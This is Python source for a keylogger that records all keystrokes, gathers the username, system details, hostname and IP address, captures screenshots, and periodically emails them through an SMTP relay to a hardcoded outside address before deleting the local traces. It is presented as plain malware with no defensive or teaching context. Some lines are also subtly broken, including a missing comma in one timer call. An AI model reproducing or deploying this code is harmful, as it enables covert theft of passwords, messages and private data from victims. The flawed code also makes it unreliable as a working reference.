import keyboard
import smtplib
import getpass
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from PIL import ImageGrab
from threading import Timer
import os
import socket
import sys
import time

class Keylogger:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.screenshot_file = "screenshot.jpg"
        self.sender_email = "email@email.com"
        self.password = "email_password"
        self.receiver_email = "abdulfarooqf8@gmail.com"

    def start(self):
        with open('keylog.txt', 'w') as file:
            file.write(self.get_system_info())
            file.write(self.get_network_info())

        # Register Ctrl+Q key combination to quit the keylogger
        keyboard.on_press(self.handle_ctrl_q)

        # Start recording the keys after a 21-second delay
        Timer(21, keyboard.on_press, args=(self.record_keys,)).start()

        # Start sending the keys and screenshot every 5 minutes  300sec
        Timer(300, self.send_data).start()

        # Keep the program running
        input("Press Enter to stop...")

    def record_keys(self, event):
        if event.event_type == "down":
            if event.name == "space":
                key = " "
            elif event.name == "enter":
                key = "\n"
            elif event.name == "backspace":
                key = ' <-- '
            elif event.name == "ctrl":
                key = 'ctrl '
            else:
                key = event.name
            
            with open("keylog.txt", "a") as file:
                file.write(key)

    def send_data(self):
        with open(self.log_file, "r") as file:
            keys = file.read()
        self.send_email("Key Log and Screenshot", keys)
        Timer(300 self.send_data).start()

    def send_email(self, subject, body):
        message = MIMEMultipart()
        message["From"] = self.sender_email
        message["To"] = self.receiver_email
        message["Subject"] = subject

        keylog_attachment = MIMEText(body, "plain")
        message.attach(keylog_attachment)

        screenshot = ImageGrab.grab()
        screenshot.save(self.screenshot_file)

        with open(self.screenshot_file, "rb") as file:
            screenshot_attachment = MIMEImage(file.read())
        screenshot_attachment.add_header("Content-Disposition", "attachment", filename=self.screenshot_file)
        message.attach(screenshot_attachment)

        while True:
            try:
                with smtplib.SMTP_SSL("smtp-relay.brevo.com", 587) as server:
                    server.login(self.sender_email, self.password)
                    server.sendmail(self.sender_email, self.receiver_email, message.as_string())
                break
            except smtplib.SMTPException:
                time.sleep(60)

        os.remove(self.screenshot_file)
        os.remove(self.log_file)
        sys.exit()

    def get_system_info(self):
        info = f"Username: {getpass.getuser()}\n"
        info += f"System: {platform.system()}\n"
        info += f"Node Name: {platform.node()}\n"
        info += f"Release: {platform.release()}\n"
        info += f"Version: {platform.version()}\n"
        info += f"Machine: {platform.machine()}\n"
        info += f"Processor: {platform.processor()}\n\n"
        return info

    def get_network_info(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return f"Hostname: {hostname}\nIP Address: {ip_address}\n\n"

    def handle_ctrl_q(self, event):
        if event.name == 'q' and event.event_type == 'down' and 'ctrl' in keyboard._pressed_events:
            sys.exit()

# Create an instance of the Keylogger class and start the keylogging process
keylogger = Keylogger()
keylogger.start()
